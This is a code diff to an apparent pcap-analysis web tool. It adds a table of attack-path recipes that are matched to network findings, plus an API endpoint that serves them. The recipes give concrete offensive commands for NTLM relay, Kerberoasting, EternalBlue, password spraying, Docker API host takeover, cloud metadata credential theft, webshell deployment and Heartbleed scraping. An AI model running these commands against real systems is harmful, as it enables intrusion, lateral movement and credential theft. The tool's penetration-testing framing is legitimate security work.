@@ -382,6 +382,343 @@ DEFAULT_CREDENTIALS = {
 
 GPP_CPASSWORD_RE = re.compile(rb'cpassword\s*=\s*"([A-Za-z0-9+/=]+)"')
 
+# Attack paths — each recipe is activated when its prerequisite findings exist.
+# match_any_category: OR across categories; match_substring: AND narrowing on title/evidence.
+ATTACK_PATHS = [
+    {
+        "id": "ntlm-relay",
+        "name": "NTLM Relay — Responder → ntlmrelayx",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["spoofable-resolution"],
+        "amplifiers": ["ntlm-capture", "smb"],
+        "description": ("Windows hosts falling back to LLMNR/NBT-NS/mDNS/WPAD can be coerced "
+                        "into authenticating to you. Any SMB target that doesn't *require* "
+                        "signing becomes a relay destination — the attack lands as code "
+                        "execution or SAM dump."),
+        "steps": [
+            "Pick a NIC on the broadcast domain: `ip a`.",
+            "Build a target list of hosts with SMB signing NOT required: "
+            "`crackmapexec smb 10.0.0.0/24 --gen-relay-list targets.txt`.",
+            "Start ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`.",
+            "In parallel, start Responder: `responder -I eth0 -wrf`.",
+            "On the next LLMNR/NBT-NS/WPAD query, the client sends NetNTLMv2 → Responder "
+            "forwards it to ntlmrelayx → relayed to the unsigned target.",
+            "Pivot via `impacket-psexec` through the proxychains SOCKS or dump SAM with "
+            "`impacket-secretsdump`.",
+        ],
+        "tools": ["Responder", "impacket ntlmrelayx", "CrackMapExec", "impacket-secretsdump"],
+    },
+    {
+        "id": "mitm6",
+        "name": "mitm6 → ntlmrelayx to LDAP (full AD takeover)",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["ipv6-takeover"],
+        "amplifiers": ["spoofable-resolution", "ntlm-capture"],
+        "description": ("Windows prefers IPv6 DHCP over IPv4 DNS. Answering DHCPv6 solicits "
+                        "makes you the primary IPv6 DNS — poison WPAD, then relay NTLM auth "
+                        "into LDAPS to create a computer account or grant yourself Resource-"
+                        "Based Constrained Delegation."),
+        "steps": [
+            "Identify a domain controller with LDAPS.",
+            "`mitm6 -d corp.local` on the same L2.",
+            "`impacket-ntlmrelayx -6 -t ldaps://dc.corp.local -wh attacker-wpad "
+            "--delegate-access`.",
+            "Wait ~5 minutes — Windows clients renew, pick you up as DNS, auth via WPAD.",
+            "ntlmrelayx creates a machine account and adds RBCD from that account to the "
+            "targeted computer — you now impersonate any user to services on that host "
+            "(`getST.py -spn cifs/victim -impersonate administrator ...`).",
+        ],
+        "tools": ["mitm6", "impacket ntlmrelayx", "impacket getST", "Rubeus"],
+    },
+    {
+        "id": "kerberoast",
+        "name": "Kerberoasting — offline crack RC4 TGS-REP",
+        "severity": "high",
+        "phase": "AD lateral",
+        "match_any_category": ["kerberos-weak"],
+        "description": ("Service accounts whose SPNs accept RC4-HMAC hand out TGS responses "
+                        "whose encrypted portion is crackable offline. Any domain user can "
+                        "request these tickets."),
+        "steps": [
+            "From a domain-user context: "
+            "`GetUserSPNs.py corp.local/user:pass -request -dc-ip <dc>`.",
+            "Feed the hashcat-ready output to hashcat mode 13100 with rockyou + OneRule.",
+            "Cracked service-account password → whatever that account has rights to "
+            "(often SQL sa, backup admin, or worse).",
+        ],
+        "tools": ["impacket GetUserSPNs", "Rubeus kerberoast", "hashcat (mode 13100)"],
+    },
+    {
+        "id": "asrep-roast",
+        "name": "AS-REP Roasting — pre-auth-disabled users",
+        "severity": "high",
+        "phase": "AD lateral",
+        "match_any_category": ["kerberos-weak"],
+        "match_substring": ["AS-REP"],
+        "description": ("Accounts with DONT_REQ_PREAUTH set return an AS-REP whose encrypted "
+                        "block is crackable offline without any valid credentials."),
+        "steps": [
+            "Enumerate pre-auth-disabled accounts: "
+            "`GetNPUsers.py corp.local/ -dc-ip <dc> -usersfile users.txt -format hashcat "
+            "-no-pass`.",
+            "Crack with `hashcat -m 18200 hashes.txt rockyou.txt -r rules/best64.rule`.",
+        ],
+        "tools": ["impacket GetNPUsers", "hashcat (mode 18200)"],
+    },
+    {
+        "id": "eternalblue",
+        "name": "EternalBlue / MS17-010",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["smb"],
+        "match_substring": ["SMBv1"],
+        "description": ("SMBv1 on the wire means hosts likely unpatched for MS17-010. "
+                        "Direct SYSTEM RCE; wormable (WannaCry/NotPetya class)."),
+        "steps": [
+            "Confirm: `nmap --script smb-vuln-ms17-010 -p445 <targets>`.",
+            "Exploit: Metasploit `exploit/windows/smb/ms17_010_eternalblue` or "
+            "standalone `eternalblue.py`.",
+            "On callback: `hashdump`, `lsa_dump`, then pivot.",
+        ],
+        "tools": ["nmap", "Metasploit ms17_010_eternalblue", "mimikatz"],
+    },
+    {
+        "id": "gpp-cpassword",
+        "name": "GPP cpassword decrypt",
+        "severity": "critical",
+        "phase": "AD lateral",
+        "match_any_category": ["ad-weakness"],
+        "match_substring": ["cpassword"],
+        "description": ("GPP XMLs stored in SYSVOL encrypt passwords with a public AES key "
+                        "(MS14-025). Decrypts instantly; the password is almost always "
+                        "reused elsewhere in the estate."),
+        "steps": [
+            "Grab the cpassword value from the finding evidence.",
+            "`gpp-decrypt '<cpassword>'` (Kali) or PowerSploit `Get-GPPPassword`.",
+            "Spray the plaintext across AD: "
+            "`crackmapexec smb <subnet> -u users.txt -p '<pw>' --continue-on-success`.",
+        ],
+        "tools": ["gpp-decrypt", "PowerSploit Get-GPPPassword", "CrackMapExec"],
+    },
+    {
+        "id": "default-creds-reuse",
+        "name": "Default credential reuse spray",
+        "severity": "critical",
+        "phase": "credential",
+        "match_any_category": ["default-creds"],
+        "description": ("Default creds on one service almost always indicate they're reused "
+                        "across the estate. Spray before they rotate."),
+        "steps": [
+            "Export the captured default pair(s) from the creds report.",
+            "Spray SMB/RDP/WinRM/MSSQL/SSH: "
+            "`crackmapexec <proto> <range> -u user -p pass --continue-on-success`.",
+            "Any host where it lands with local-admin rights → dump LSASS, escalate.",
+        ],
+        "tools": ["CrackMapExec", "Hydra", "Medusa"],
+    },
+    {
+        "id": "cred-spray",
+        "name": "Username harvest → password spray",
+        "severity": "high",
+        "phase": "credential",
+        "match_any_category": ["ntlm-capture", "recon", "cleartext-creds"],
+        "description": ("You already have the usernames from RDP mstshash, NTLM Type 3, "
+                        "VRFY/EXPN, and captured logins. Combine with seasonal/company-"
+                        "themed password lists and spray low-and-slow."),
+        "steps": [
+            "Export usernames from the creds tab + findings with `mstshash`/`VRFY`/`NTLMSSP Type 3`.",
+            "Build a spray list: seasonal (`Spring2026!`), company (`<Company>1`), "
+            "common weak (`Password1`).",
+            "Spray carefully to dodge AD lockout thresholds: "
+            "`crackmapexec smb <dc> -u users.txt -p spray.txt -t 1 --continue-on-success`.",
+        ],
+        "tools": ["CrackMapExec", "Kerbrute", "DomainPasswordSpray.ps1"],
+    },
+    {
+        "id": "web-rce-chain",
+        "name": "Web exploitation follow-through",
+        "severity": "critical",
+        "phase": "web",
+        "match_any_category": ["web-attack"],
+        "description": ("HTTP payload signatures mean either the target has been probed for "
+                        "a known RCE/SSRF or is reachable for such probes. For each finding, "
+                        "match to the public exploit and land a webshell."),
+        "steps": [
+            "For each web-attack finding, take the target host and the X-Powered-By / "
+            "Server-header banners for exact version fingerprinting.",
+            "Confirm with a benign PoC (non-destructive).",
+            "Log4Shell → JNDIExploit + Marshalsec. Spring4Shell → spring4shell-scan. "
+            "ProxyShell → PowerShell chain. Citrix CVE-2019-19781 → vendor metasploit. "
+            "F5 CVE-2022-1388 → public PoC.",
+            "Drop a low-footprint webshell (behaviour-constrained, not `/shell.php`), "
+            "pivot inward via the webapp's subnet.",
+        ],
+        "tools": ["Metasploit", "Nuclei", "exploitdb", "JNDIExploit"],
+    },
+    {
+        "id": "heartbleed",
+        "name": "Heartbleed memory extraction",
+        "severity": "critical",
+        "phase": "web",
+        "match_any_category": ["vuln-version"],
+        "match_substring": ["Heartbleed"],
+        "description": ("OpenSSL <1.0.1g leaks up to 64KB of server memory per heartbeat. "
+                        "Pull cookies, plaintext creds, and — with luck — the cert's private key."),
+        "steps": [
+            "Confirm: `nmap -p443 --script ssl-heartbleed <target>`.",
+            "Mass-scrape: `heartleech <target> -f dump.bin`; grep for `Cookie: `, "
+            "`password=`, `-----BEGIN`.",
+            "If you pull the private key, decrypt captured TLS and impersonate the server.",
+        ],
+        "tools": ["nmap ssl-heartbleed", "heartleech",
+                  "Metasploit auxiliary/scanner/ssl/openssl_heartbleed"],
+    },
+    {
+        "id": "ics-direct",
+        "name": "ICS / OT direct control",
+        "severity": "critical",
+        "phase": "OT",
+        "match_any_category": ["ics-ot"],
+        "description": ("Modbus/S7/DNP3/IEC-104 grant read and WRITE authority with zero "
+                        "auth. Actuating anything in production can injure people or damage "
+                        "equipment — read-only recon only, with written authorization."),
+        "steps": [
+            "Enumerate: `nmap --script modbus-discover -p502 <target>` / "
+            "`plcscan <target>` / S7: `msf > use auxiliary/scanner/scada/profinet_siemens`.",
+            "Read a handful of coils/registers as proof. Log exactly what you read.",
+            "STOP. Document reachable function codes (5/6/15/16 = write) and report — "
+            "do not issue writes without explicit sign-off from the ICS owner.",
+        ],
+        "tools": ["nmap modbus-discover", "plcscan", "smod", "ISF"],
+    },
+    {
+        "id": "exposed-mgmt",
+        "name": "Exposed management plane → instant RCE",
+        "severity": "critical",
+        "phase": "exposure",
+        "match_any_category": ["exposed-service"],
+        "match_substring": ["DOCKER-API", "KUBE-API", "KUBELET", "ETCD",
+                            "WINRM-HTTP", "MIKROTIK", "SALT"],
+        "description": ("Unauthenticated management APIs give RCE / cluster takeover in "
+                        "a single request."),
+        "steps": [
+            "Docker 2375: `docker -H tcp://<host>:2375 run -v /:/host --rm -it alpine "
+            "chroot /host sh` → host root.",
+            "kubelet 10250: `curl -k https://<host>:10250/pods` → `exec` into any pod.",
+            "SaltStack 4505/4506: CVE-2020-11651 PoC → root on the master and every minion.",
+            "MikroTik Winbox 8291: `winbox_exploit` (CVE-2018-14847) dumps creds.",
+            "WinRM-HTTP 5985: `evil-winrm -i <host> -u user -H <nthash>` → interactive shell.",
+        ],
+        "tools": ["docker client", "evil-winrm", "exploit-saltstack-cve-2020-11651",
+                  "winbox-exploit"],
+    },
+    {
+        "id": "cloud-imds",
+        "name": "Cloud IMDS → temporary IAM credentials",
+        "severity": "critical",
+        "phase": "cloud",
+        "match_any_category": ["cloud-ssrf"],
+        "description": ("An SSRF-reachable cloud metadata endpoint hands you the instance's "
+                        "IAM role creds. Usable from anywhere until they expire (~hours)."),
+        "steps": [
+            "Confirm the SSRF works through the vulnerable app.",
+            "AWS: `GET /latest/meta-data/iam/security-credentials/` → role → "
+            "`GET .../<role>` → AccessKey / Secret / Token.",
+            "Load creds locally: `aws configure set aws_session_token <token>`; "
+            "`aws sts get-caller-identity`.",
+            "Enumerate with Pacu: `sessions import`, then `iam__enum_permissions`.",
+            "GCP: path is `http://metadata.google.internal/computeMetadata/v1/instance/"
+            "service-accounts/default/token` with header `Metadata-Flavor: Google`.",
+        ],
+        "tools": ["curl", "awscli", "Pacu", "gcloud"],
+    },
+    {
+        "id": "vnc-none",
+        "name": "VNC no-auth → immediate desktop access",
+        "severity": "critical",
+        "phase": "direct-access",
+        "match_any_category": ["weak-auth"],
+        "match_substring": ["VNC"],
+        "description": ("VNC offering security type 1 (None) hands you the desktop. No "
+                        "credentials required."),
+        "steps": [
+            "`vncviewer <host>:5900`.",
+            "Identify who's logged in before you move the mouse — if a session is active, "
+            "mark it out-of-scope for direct interaction and document the exposure instead.",
+        ],
+        "tools": ["vncviewer"],
+    },
+    {
+        "id": "radius-crack",
+        "name": "RADIUS shared-secret → plaintext passwords",
+        "severity": "high",
+        "phase": "credential",
+        "match_any_category": ["weak-auth"],
+        "match_substring": ["RADIUS"],
+        "description": ("The Access-Request's User-Password attribute is MD5'd with the "
+                        "shared secret. Weak/guessed secrets → instant plaintext recovery."),
+        "steps": [
+            "Extract the matching Access-Request + Access-Accept/Reject pair from the pcap.",
+            "Brute the shared secret with a custom MD5 tool or published `radcrack` "
+            "(the operation is one MD5 per guess).",
+            "With the secret, decrypt User-Password.",
+        ],
+        "tools": ["radcrack", "custom md5 bruter", "hashcat"],
+    },
+    {
+        "id": "session-hijack",
+        "name": "HTTP session hijacking",
+        "severity": "high",
+        "phase": "web",
+        "match_any_category": ["cleartext-creds", "http-hardening"],
+        "match_substring": ["Cookie", "Secure"],
+        "description": ("Session cookies leaked over plain HTTP or without the Secure flag "
+                        "mean account takeover in one request."),
+        "steps": [
+            "Pull the cookie from the creds tab or the flow packet view.",
+            "Replay: `curl -H 'Cookie: <name>=<value>' https://site/account` — most apps "
+            "accept the cookie over HTTPS even when it was captured from HTTP.",
+            "If it's a JWT, decode and check for weak signing (alg=none, weak HS256 secret).",
+        ],
+        "tools": ["curl", "Burp Suite", "jwt_tool"],
+    },
+    {
+        "id": "exposed-sensitive",
+        "name": "Perimeter-exposed sensitive service",
+        "severity": "high",
+        "phase": "exposure",
+        "match_any_category": ["exposed-service"],
+        "match_substring": ["public", "accepts"],
+        "description": ("SMB/RDP/MSSQL/etc. reachable from the internet = starting position "
+                        "for credential stuffing, known-CVE exploitation, or brute force."),
+        "steps": [
+            "Banner-grab: `nmap -sV -p <port> <host>` + `nc -zv <host> <port>`.",
+            "If the banner hits a known CVE, jump straight to that exploit.",
+            "Otherwise stuff credentials from the cred-spray path (CrackMapExec / patator).",
+        ],
+        "tools": ["nmap", "CrackMapExec", "patator"],
+    },
+    {
+        "id": "beacon-investigation",
+        "name": "C2 beacon — triage compromised host",
+        "severity": "high",
+        "phase": "incident",
+        "match_any_category": ["beaconing", "suspicious-traffic"],
+        "description": ("Regular low-jitter beaconing means a host is already calling out. "
+                        "If it's not yours, isolate and collect."),
+        "steps": [
+            "From the graph, the beacon source is your primary target. The destination is "
+            "the C2.",
+            "Threat-intel the destination IP: VirusTotal, AlienVault OTX, urlscan.",
+            "If hostile: network-isolate the host, collect memory "
+            "(winpmem / AVML / LiME), rotate any creds or tokens it held.",
+        ],
+        "tools": ["VirusTotal", "winpmem", "Velociraptor", "AVML"],
+    },
+]
+
 
 def classify_port(port):
     """Return (service_name, is_plaintext) for a given port."""
@@ -1847,6 +2184,49 @@ class PcapAnalysis:
                         remediation="Place service behind VPN or allowlist by IP.",
                         key=("multi-ext-listen", dst, port))
 
+    def analyze_attack_paths(self):
+        with self.lock:
+            by_category = defaultdict(list)
+            for f in self.findings:
+                by_category[f["category"]].append(f)
+
+            active = []
+            for recipe in ATTACK_PATHS:
+                cats = recipe.get("match_any_category", [])
+                candidates = []
+                for cat in cats:
+                    candidates.extend(by_category.get(cat, []))
+                subs = recipe.get("match_substring") or []
+                if subs:
+                    filt = []
+                    lows = [s.lower() for s in subs]
+                    for f in candidates:
+                        hay = (f["title"] + " " + str(f.get("evidence") or "")).lower()
+                        if any(s in hay for s in lows):
+                            filt.append(f)
+                    candidates = filt
+                if not candidates:
+                    continue
+                amps = []
+                for c in recipe.get("amplifiers", []):
+                    amps.extend(by_category.get(c, []))
+                hosts = sorted({h for f in candidates for h in (f.get("hosts") or [])})
+                active.append({
+                    "id": recipe["id"],
+                    "name": recipe["name"],
+                    "severity": recipe["severity"],
+                    "phase": recipe.get("phase", ""),
+                    "description": recipe["description"],
+                    "steps": recipe["steps"],
+                    "tools": recipe.get("tools", []),
+                    "affected_hosts": hosts,
+                    "evidence_count": len(candidates),
+                    "evidence_ids": [f["id"] for f in candidates[:30]],
+                    "amplifier_count": len(amps),
+                })
+            active.sort(key=lambda p: (SEVERITY_RANK.get(p["severity"], 99), p["phase"]))
+            return active
+
     def summary(self):
         with self.lock:
             sev_counts = Counter(f["severity"] for f in self.findings)
@@ -2307,6 +2687,19 @@ def api_findings():
         "categories": cats,
         "severity_counts": dict(sev_counts),
         "total": len(analysis.findings),
+    })
+
+
+@app.route("/api/attack-paths")
+def api_attack_paths():
+    if not analysis:
+        return jsonify({"error": "no pcap loaded"}), 404
+    paths = analysis.analyze_attack_paths()
+    return jsonify({
+        "paths": paths,
+        "total": len(paths),
+        "by_severity": {s: sum(1 for p in paths if p["severity"] == s)
+                        for s in ["critical", "high", "medium", "low", "info"]},
     })
 
 
